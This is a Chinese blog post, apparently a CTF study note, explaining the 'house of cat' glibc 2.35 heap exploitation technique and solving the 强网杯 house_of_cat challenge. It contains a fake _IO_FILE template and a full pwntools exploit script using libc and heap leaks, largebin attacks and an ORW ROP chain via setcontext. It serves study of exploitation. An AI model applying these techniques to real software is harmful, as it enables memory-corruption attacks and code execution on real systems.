<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="UTF-8">
  <meta 
    name="viewport"
    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
  <meta 
    http-equiv="X-UA-Compatible" 
    content="ie=edge">
  <meta 
    name="theme-color" 
    content="#fff" 
    id="theme-color">
  <meta 
    name="description" 
    content="Hexo">
  <link 
    rel="icon" 
    href="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg">
  <title>house_of_cat</title>
  
    
      <meta 
        property="og:title" 
        content="house_of_cat">
    
    
      <meta 
        property="og:url" 
        content="http://example.com/2022/09/14/house-of-cat/index.html">
    
    
      <meta 
        property="og:img" 
        content="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg">
    
    
    
      <meta 
        property="og:type" 
        content="article">
      <meta 
        property="og:article:published_time" 
        content="2022-09-14">
      <meta 
        property="og:article:modified_time" 
        content="2022-09-14">
      <meta 
        property="og:article:author" 
        content="幽林">
      
        
      
    
  
  
  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
  <link rel="preload" href="/css/main.css" as="style" >
  
  <link rel="modulepreload" href="//instant.page/5.1.0">
  
  <link rel="stylesheet" href="/css/main.css">
  
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
  
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
  
  
  
    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
  
  <script>
    function loadScript(url, cb) {
      var script = document.createElement('script');
      script.src = url;
      if (cb) script.onload = cb;
      script.async = true;
      document.body.appendChild(script);
    }
    function loadCSS(href, data, attr) {
      var sheet = document.createElement('link');
      sheet.ref = 'stylesheet';
      sheet.href = href;
      sheet.dataset[data] = attr;
      document.head.appendChild(sheet);
    }
    function changeCSS(cssFile, data, attr) {
      var oldlink = document.querySelector(data);
      var newlink = document.createElement("link");
      newlink.setAttribute("rel", "stylesheet");
      newlink.setAttribute("href", cssFile);
      newlink.dataset.prism = attr;
      document.head.replaceChild(newlink, oldlink);
    }
  </script>
  
    
  
  <script>
    // control reverse button
    var reverseDarkList = {
      dark: 'light',
      light: 'dark'
    };
    var themeColor = {
      dark: '#1c1c1e',
      light: '#fff'
    }
    // get the data of css prefers-color-scheme
    var getCssMediaQuery = function() {
      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
    };
    // reverse current darkmode setting function
    var reverseDarkModeSetting = function() {
      var setting = localStorage.getItem('user-color-scheme');
      if(reverseDarkList[setting]) {
        setting = reverseDarkList[setting];
      } else if(setting === null) {
        setting = reverseDarkList[getCssMediaQuery()];
      } else {
        return;
      }
      localStorage.setItem('user-color-scheme', setting);
      return setting;
    };
    // apply current darkmode setting
  </script>
  
    <script>
      var setDarkmode = function(mode) {
      var setting = mode || localStorage.getItem('user-color-scheme');
      if(setting === getCssMediaQuery()) {
        document.documentElement.removeAttribute('data-user-color-scheme');
        localStorage.removeItem('user-color-scheme');
        document.getElementById('theme-color').content = themeColor[setting];
        document.getElementById('theme-color').dataset.mode = setting;
      } else if(reverseDarkList[setting]) {
        document.documentElement.setAttribute('data-user-color-scheme', setting);
        document.getElementById('theme-color').content = themeColor[setting];
        document.getElementById('theme-color').dataset.mode = setting;
      } else {
        document.documentElement.removeAttribute('data-user-color-scheme');
        localStorage.removeItem('user-color-scheme');
        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
      }
    };
    setDarkmode();
    </script>
  
  
  
    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
  
  
    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
  
  
  
  
  
  
<meta name="generator" content="Hexo 6.0.0"></head>

  <body>
    <div class="wrapper">
       
      <nav class="navbar">
  <div class="navbar-logo">
    <a class="navbar-logo-main" href="/">
      
        <img 
          class="navbar-logo-img"
          width="32"
          height="32"
          src="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg" 
          alt="blog logo">
      
      <span class="navbar-logo-dsc">幽林</span>
      </a>
  </div>
  <div class="navbar-menu">
    
      <a 
        href="/" 
        class="navbar-menu-item">
        
          Home
        
      </a>
    
      <a 
        href="/archives" 
        class="navbar-menu-item">
        
          Archive
        
      </a>
    
      <a 
        href="/tags" 
        class="navbar-menu-item">
        
          Tags
        
      </a>
    
      <a 
        href="/categories" 
        class="navbar-menu-item">
        
          Categories
        
      </a>
    
      <a 
        href="/about" 
        class="navbar-menu-item">
        
          About
        
      </a>
    
      <a 
        href="/links" 
        class="navbar-menu-item">
        
          Friends
        
      </a>
    
    <button 
      class="navbar-menu-item darknavbar navbar-menu-btn" 
      aria-label="Toggle dark mode"
      id="dark">
      <i class="iconfont icon-weather"></i>
    </button>
    <button 
      class="navbar-menu-item searchnavbar navbar-menu-btn" 
      aria-label="Toggle search"
      id="search">
      <!-- <i 
        class="iconfont icon-search" 
        style="font-size: 1.2rem; font-weight: 400;">
      </i> -->
      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img"
        class="iconify iconify--ion" width="28" height="28" preserveAspectRatio="xMidYMid meet" viewBox="0 0 512 512">
        <path fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="28"
          d="M256 80a176 176 0 1 0 176 176A176 176 0 0 0 256 80Z"></path>
        <path fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="28"
          d="M232 160a72 72 0 1 0 72 72a72 72 0 0 0-72-72Z"></path>
        <path fill="none" stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="28"
          d="M283.64 283.64L336 336"></path>
      </svg>
    </button>
  </div>
</nav> 
      
      <div 
        id="local-search" 
        style="display: none">
        <input
          class="navbar-menu-item"
          id="search-input"
          placeholder="请输入搜索内容..." />
        <div id="search-content"></div>
      </div>
      
      <div class="section-wrap">
        <div class="container">
          <div class="columns">
            <aside class="left-column">
              
              <div class="card card-author">
                
  <img 
    src="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg" 
    class="author-img"
    width="88"
    height="88"
    alt="author avatar">

<p class="author-name">幽林</p>
<p class="author-description">太菜了，只能输出点垃圾</p>
<div class="author-message">
  <a 
    class="author-posts-count" 
    href="/archives">
    <span>17</span>
    <span>Posts</span>
  </a>
  <a 
    class="author-categories-count" 
    href="/categories">
    <span>0</span>
    <span>Categories</span>
  </a>
  <a 
    class="author-tags-count" 
    href="/tags">
    <span>0</span>
    <span>Tags</span>
  </a>
</div>

              </div>
               <div class="sticky-tablet">
  
  
    <article class="display-when-two-columns spacer">
      <div class="card card-content toc-card">
        <div class="toc-header">
  <i 
    class="iconfont icon-menu" 
    style="padding-right: 2px;">
  </i>TOC
</div>
<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-cat%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95"><span class="toc-text">house_of_cat学习记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D"><span class="toc-text">攻击介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-text">攻击流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF%EF%BC%9Ahouse-of-cat"><span class="toc-text">强网杯：house_of_cat</span></a></li></ol></li></ol>
      </div>
    </article>
  
  
  <article class="card card-content categories-widget">
    <div class="categories-card">
  <div class="categories-header">
    <i 
      class="iconfont icon-fenlei" 
      style="padding-right: 2px;">
    </i>Categories
  </div>
  <div class="categories-list">
    
  </div>
</div>
  </article>
  
  <article class="card card-content tags-widget">
    <div class="tags-card">
  <div class="tags-header">
    <i 
      class="iconfont icon-biaoqian" 
      style="padding-right: 2px;">
    </i>hot tags
  </div>
  <div class="tags-list">
    
  </div>
</div>
  </article>
  
  
</div>
            </aside>
            <main class="main-column">
              
<article class="card card-content">
  <header>
    <h1 class="post-title">
      house_of_cat
    </h1>
  </header>
  <div class="post-meta post-show-meta">
    <time datetime="2022-09-14T12:09:00.000Z">
      <i 
        class="iconfont icon-calendar" 
        style="margin-right: 2px;">
      </i>
      <span>2022-09-14</span>
    </time>
    
    
      <span class="dot"></span>
      <span>1.6k words</span>
    
  </div>
  
  </header>
  <div 
    id="section" 
    class="post-content">
    <h1 id="house-of-cat学习记录"><a href="#house-of-cat学习记录" class="headerlink" title="house_of_cat学习记录"></a>house_of_cat学习记录</h1><p>具体原理：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-273895.htm#msg_header_h3_6">https://bbs.pediy.com/thread-273895.htm#msg_header_h3_6</a></p>
<h2 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h2><p>在造成任意地址写一个堆地址的基础上，这里的寄存器rdi（fake_IO的地址）、rax和rdx都是我们可以控制的，在<strong>开启沙箱</strong>的情况下，假如把最后调用的**[rax + 0x18]设置为setcontext，把rdx设置为可控的堆地址，就能执行srop来读取flag<strong>；如果</strong>未开启沙箱<strong>，则只需把</strong>最后调用的[rax + 0x18]设置为system函数，把fake_IO的头部写入/bin/sh字符串**，就可执行system(“/bin/sh”)</p>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>1.修改**_IO_list_all<strong>为可控地址（</strong>FSOP<strong>）或修改</strong>stderr<strong>为可控地址(</strong>__malloc_assert**)。<br>2.在上一步的可控地址中伪造<strong>fake_IO结构体</strong>(也可以在任意地址写的情况下修改<strong>stderr、stdout</strong>等结构体)。<br>3.通过<strong>FSOP</strong>或<strong>malloc</strong>触发攻击。</p>
<p>catfly师傅画的图：</p>
<p><img src="https://bbs.pediy.com/upload/attach/202208/959842_JDJKTRK7GJUEUFR.png" alt="图片描述" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://bbs.pediy.com/upload/attach/202208/959842_JDJKTRK7GJUEUFR.png" class="lozad post-image"></p>
<p><strong>模板：</strong></p>
<pre class="highlight"><span class="line">fake_io_addr=heapbase+0xb00 # 伪造的fake_IO结构体的地址</span><br><span class="line">next_chain = 0</span><br><span class="line">fake_IO_FILE=p64(rdi)         #_flags=rdi</span><br><span class="line">fake_IO_FILE+=p64(0)*7</span><br><span class="line">fake_IO_FILE +=p64(1)+p64(0)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx</span><br><span class="line">fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x68, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(0)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x88, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xa0, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xc0, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(0)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xd8, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(libcbase+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10</span><br><span class="line">fake_IO_FILE +=p64(0)*6</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr</span><br></pre>

<h2 id="强网杯：house-of-cat"><a href="#强网杯：house-of-cat" class="headerlink" title="强网杯：house_of_cat"></a>强网杯：house_of_cat</h2><p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\1663157815912.png" alt="1663157815912" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\1663157815912.png" class="lozad post-image"></p>
<p>一道GLIBC 2.35-0ubuntu3开了沙箱的题</p>
<pre class="highlight"><span class="line">__int64 __fastcall sub_1A50(char *a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  char *s; // [rsp+18h] [rbp-28h]</span><br><span class="line">  char *v4; // [rsp+20h] [rbp-20h]</span><br><span class="line">  char *v5; // [rsp+20h] [rbp-20h]</span><br><span class="line">  char *v6; // [rsp+20h] [rbp-20h]</span><br><span class="line">  const char *s2; // [rsp+28h] [rbp-18h]</span><br><span class="line">  char *v8; // [rsp+30h] [rbp-10h]</span><br><span class="line">  const char *s1; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = strstr(a1, &quot;QWB&quot;);</span><br><span class="line">  if ( !v4 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *v4 = 0;</span><br><span class="line">  v4[1] = 0;</span><br><span class="line">  v4[2] = 32;</span><br><span class="line">  v5 = v4 + 3;</span><br><span class="line">  s2 = strtok(a1, &quot; &quot;);</span><br><span class="line">  if ( !strcmp(&quot;LOGIN&quot;, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    *(a2 + 8) = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( *(a2 + 8) || strcmp(&quot;DOG&quot;, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(a2 + 8) || strcmp(&quot;CAT&quot;, s2) )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *(a2 + 8) || strcmp(&quot;MONKEY&quot;, s2) )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *(a2 + 8) || strcmp(&quot;FISH&quot;, s2) )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( *(a2 + 8) || strcmp(&quot;PIG&quot;, s2) )</span><br><span class="line">          &#123;</span><br><span class="line">            if ( *(a2 + 8) || strcmp(&quot;WOLF&quot;, s2) )</span><br><span class="line">            &#123;</span><br><span class="line">              if ( *(a2 + 8) || strcmp(&quot;DUCK&quot;, s2) )</span><br><span class="line">              &#123;</span><br><span class="line">                if ( *(a2 + 8) || strcmp(&quot;GOLF&quot;, s2) )</span><br><span class="line">                &#123;</span><br><span class="line">                  if ( *(a2 + 8) || strcmp(&quot;TIGER&quot;, s2) )</span><br><span class="line">                    return 0LL;</span><br><span class="line">                  *(a2 + 8) = 10;</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                  *(a2 + 8) = 9;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              else</span><br><span class="line">              &#123;</span><br><span class="line">                *(a2 + 8) = 8;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">              *(a2 + 8) = 7;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            *(a2 + 8) = 6;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          *(a2 + 8) = 5;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        *(a2 + 8) = 4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      *(a2 + 8) = 3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    *(a2 + 8) = 2;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = strtok(0LL, &quot; &quot;);</span><br><span class="line">  if ( v8 != strchr(v8, 124) )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *a2 = v8;</span><br><span class="line">  s1 = strtok(0LL, &quot; &quot;);</span><br><span class="line">  if ( strcmp(s1, &quot;r00t&quot;) )</span><br><span class="line">    return 0LL;</span><br><span class="line">  s = v5 + 5;</span><br><span class="line">  v6 = strstr(v5, &quot;QWXF&quot;);</span><br><span class="line">  if ( !v6 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *v6 = 0;</span><br><span class="line">  v6[1] = 0;</span><br><span class="line">  v6[2] = 0;</span><br><span class="line">  v6[3] = 32;</span><br><span class="line">  *(a2 + 16) = s;</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre>

<p>要想开始做堆题还得绕过上面这堆判断：LOGIN | r00t QWB QWXFadmin</p>
<pre class="highlight"><span class="line">__int64 __fastcall sub_1DF3(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  unsigned int v2; // eax</span><br><span class="line">  char *v3; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( *(a1 + 8) == 1 &amp;&amp; !strcmp(*(a1 + 16), &quot;admin&quot;) )</span><br><span class="line">    dword_4040[0] = 1;</span><br><span class="line">  result = *(a1 + 8);</span><br><span class="line">  if ( result == 3 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = strtok(*(a1 + 16), &quot;$&quot;);</span><br><span class="line">    v3 = result;</span><br><span class="line">    if ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      result = dword_4014;</span><br><span class="line">      if ( *v3 == dword_4014 )</span><br><span class="line">      &#123;</span><br><span class="line">        result = dword_4040[0];</span><br><span class="line">        if ( dword_4040[0] )</span><br><span class="line">        &#123;</span><br><span class="line">          menu();</span><br><span class="line">          v2 = choice();</span><br><span class="line">          if ( v2 == 4 )</span><br><span class="line">          &#123;</span><br><span class="line">            return sub_1916();</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            if ( v2 &lt;= 4 )</span><br><span class="line">            &#123;</span><br><span class="line">              switch ( v2 )</span><br><span class="line">              &#123;</span><br><span class="line">                case 3u:</span><br><span class="line">                  return edit();</span><br><span class="line">                case 1u:</span><br><span class="line">                  return add();</span><br><span class="line">                case 2u:</span><br><span class="line">                  return delete();</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return sub_12D9(&quot;error!\n&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre>

<p>然后操作堆块的时候还需要先输入：CAT | r00t QWB QWXF$\xff</p>
<p><img  srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://tuchuangs.com/imgs/2022/09/14/2f1bade8876828af.png" class="lozad post-image"src="https://tuchuangs.com/imgs/2022/09/14/2f1bade8876828af.png"></p>
<p>由于题目直接存在uaf，所以可以直接通过unsorted bin泄露libc(其实直接通过largebin也可以直接泄露libc,而且还可以泄露heapbase)</p>
<pre class="highlight"><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./house_of_cat&#x27;)</span><br><span class="line">#io=remote(&quot;1.14.71.254&quot;,28566)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: log.info(x)</span><br><span class="line">db = lambda: gdb.attach(io)</span><br><span class="line">sa(&#x27;mew mew mew~~~~~~&#x27;,&#x27;LOGIN | r00t QWB QWXFadmin&#x27;)</span><br><span class="line">def add(idx,size,cont):</span><br><span class="line">    sa(&#x27;mew mew mew~~~~~~&#x27;, &#x27;CAT | r00t QWB QWXF$\xff&#x27;)</span><br><span class="line">    sla(&#x27;plz input your cat choice:\n&#x27;,str(1))</span><br><span class="line">    sla(&#x27;plz input your cat idx:\n&#x27;,str(idx))</span><br><span class="line">    sla(&#x27;plz input your cat size:\n&#x27;,str(size))</span><br><span class="line">    sa(&#x27;plz input your content:\n&#x27;,cont)</span><br><span class="line">def delete(idx):</span><br><span class="line">    sa(&#x27;mew mew mew~~~~~~&#x27;, &#x27;CAT | r00t QWB QWXF$\xff&#x27;)</span><br><span class="line">    sla(&#x27;plz input your cat choice:\n&#x27;, str(2))</span><br><span class="line">    sla(&#x27;plz input your cat idx:\n&#x27;,str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">    sa(&#x27;mew mew mew~~~~~~&#x27;, &#x27;CAT | r00t QWB QWXF$\xff&#x27;)</span><br><span class="line">    sla(&#x27;plz input your cat choice:\n&#x27;, str(3))</span><br><span class="line">    sla(&#x27;plz input your cat idx:\n&#x27;,str(idx))</span><br><span class="line">def edit(idx,cont):</span><br><span class="line">    sa(&#x27;mew mew mew~~~~~~&#x27;, &#x27;CAT | r00t QWB QWXF$\xff&#x27;)</span><br><span class="line">    sla(&#x27;plz input your cat choice:\n&#x27;, str(4))</span><br><span class="line">    sla(&#x27;plz input your cat idx:\n&#x27;,str(idx))</span><br><span class="line">    sa(&#x27;plz input your content:\n&#x27;, cont)</span><br><span class="line"></span><br><span class="line">add(0,0x420,&#x27;youlin&#x27;)</span><br><span class="line">add(1,0x430,&#x27;youlin&#x27;)</span><br><span class="line">add(2,0x418,&#x27;youlin&#x27;)</span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">libcbase=u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))-0x219ce0  #直接用下面的largebin也可以泄露libc</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">add(3,0x440,&#x27;youlin&#x27;)</span><br><span class="line"></span><br><span class="line">pop_rdi=libcbase+0x000000000002a3e5</span><br><span class="line">pop_rsi=libcbase+0x000000000002be51</span><br><span class="line">pop_rdx_r12=libcbase+0x000000000011f497</span><br><span class="line">ret=libcbase+0x0000000000029cd6</span><br><span class="line">pop_rax=libcbase+0x0000000000045eb0</span><br><span class="line">stderr=libcbase+libc.sym[&#x27;stderr&#x27;]</span><br><span class="line">setcontext=libcbase+libc.sym[&#x27;setcontext&#x27;]</span><br><span class="line">close=libcbase+libc.sym[&#x27;close&#x27;]</span><br><span class="line">read=libcbase+libc.sym[&#x27;read&#x27;]</span><br><span class="line">write=libcbase+libc.sym[&#x27;write&#x27;]</span><br><span class="line">syscallret=libcbase+0x91396</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">io.recvuntil(b&quot;\x7f&quot;)[-6:]#可以通过这里泄露libc,这里可以接收到main_arena+0x1104处的地址</span><br><span class="line">io.recv(10)</span><br><span class="line">heapbase=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x290</span><br><span class="line">print(&quot;heapbase:&quot;+hex(heapbase))</span><br></pre>

<p>然后就是写模板了</p>
<pre class="highlight"><span class="line">fake_io=heapbase+0xb00</span><br><span class="line"></span><br><span class="line">fake_IO_FILE = p64(0)*4</span><br><span class="line">fake_IO_FILE +=p64(0)</span><br><span class="line">fake_IO_FILE +=p64(0)</span><br><span class="line">fake_IO_FILE +=p64(1)+p64(0)</span><br><span class="line">fake_IO_FILE +=p64(heapbase+0xc18-0x68)#rdx</span><br><span class="line">fake_IO_FILE +=p64(setcontext+61)#call addr</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x58, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(0 )  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x78, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(heapbase+0x200)  # _lock = writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x90, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE +=p64(heapbase+0xb30) #rax1</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xB0, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(0)  # _mode = 0</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(libcbase+0x2160d0)  # vtable=IO_wfile_jumps+0x10</span><br><span class="line">fake_IO_FILE +=p64(0)*6</span><br><span class="line">fake_IO_FILE += p64(heapbase+0xb30+0x10)  # rax2</span><br><span class="line">flagaddr=heapbase+0x17d0 </span><br></pre>

<p>然后就是通过一次largebin attack打stderr，修改stderr为堆上的地址（即指向写orw的地址）</p>
<pre class="highlight"><span class="line">payload1=fake_IO_FILE+p64(flagaddr)+p64(0)+p64(0)*5+p64(heapbase+0x2050)+p64(ret)</span><br><span class="line">delete(2)</span><br><span class="line">add(6,0x418,payload1)</span><br><span class="line">delete(6)</span><br><span class="line">edit(0,p64(libcbase+0x21a0d0)*2+p64(heapbase+0x290)+p64(stderr-0x20))#first large_bin_attack  设置fd和bk指针指向原来的main_arena+0x1104处，bk_nextsize指向stderr-0x20处</span><br><span class="line">add(5,0x440,&#x27;youlin&#x27;)</span><br><span class="line">add(7,0x430,&#x27;flag.txt&#x27;)</span><br><span class="line">add(8,0x430,&#x27;youlin&#x27;)</span><br><span class="line"></span><br><span class="line">orw=p64(pop_rdi)+p64(0)+p64(close)+p64(pop_rdi)+p64(flagaddr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscallret)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(flagaddr)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(read)+p64(pop_rdi)+p64(1)+p64(write)</span><br><span class="line">add(9,0x430,orw)</span><br><span class="line">delete(5)</span><br><span class="line">add(10,0x450,p64(0)+p64(1))</span><br><span class="line">delete(8)</span><br></pre>

<p><img  srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://tuchuangs.com/imgs/2022/09/14/4b938f0d3d5ad9cc.png" class="lozad post-image"src="https://tuchuangs.com/imgs/2022/09/14/4b938f0d3d5ad9cc.png"></p>
<p>最后构造一个largebin attack topchunk size，通过修改top chunk的size去执行__mallo_assert,最终跳转到context执行orw</p>
<pre class="highlight"><span class="line"># second large bin attack - topchunk&#x27;s size</span><br><span class="line">edit(5,p64(libcbase+0x21a0e0)*2+p64(heapbase+0x1370)+p64(heapbase+0x28e0-0x20+3))</span><br><span class="line">#dbg()</span><br><span class="line">#trigger __malloc_assert</span><br><span class="line">sa(&#x27;mew mew mew~~~~~~&#x27;, &#x27;CAT | r00t QWB QWXF$\xff&#x27;)</span><br><span class="line">sla(&#x27;plz input your cat choice:\n&#x27;,str(1))</span><br><span class="line">sla(&#x27;plz input your cat idx:&#x27;,str(11))</span><br><span class="line">sla(&#x27;plz input your cat size:&#x27;,str(0x450))</span><br><span class="line">io.interactive()</span><br></pre>


  </div>
  <div>
    
      <div 
        class="post-note note-warning copyright" 
        style="margin-top: 42px">
        <p>
          <span style="font-weight: bold;">作者：</span><a 
            target="_blank" 
            rel="nofollow noopener noreferrer" 
            href="/about">
            幽林
          </a>
        </p>
        <p>
          <span style="font-weight: bold;">文章链接：</span><a 
            target="_blank" 
            rel="nofollow noopener noreferrer" 
            href="http://example.com/2022/09/14/house-of-cat/">
            http://example.com/2022/09/14/house-of-cat/
          </a>
        </p>
        <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
      </div>
    
  </div>
</article>
<div class="nav">
  
  
    <div class="nav-item-next">
      <a 
        href="/2022/09/12/%E5%91%A8%E6%8A%A5%E6%A8%A1%E6%9D%BF/" 
        class="nav-link">
        <div>
          <div class="nav-label">Next</div>
          
            <div class="nav-title">周报模板 </div>
          
        </div>
        <i class="iconfont icon-right nav-next-icon"></i>
      </a>
    </div>
  
</div>

<div 
  class="card card-content toc-card" 
  id="mobiletoc">
  <div class="toc-header">
  <i 
    class="iconfont icon-menu" 
    style="padding-right: 2px;">
  </i>TOC
</div>
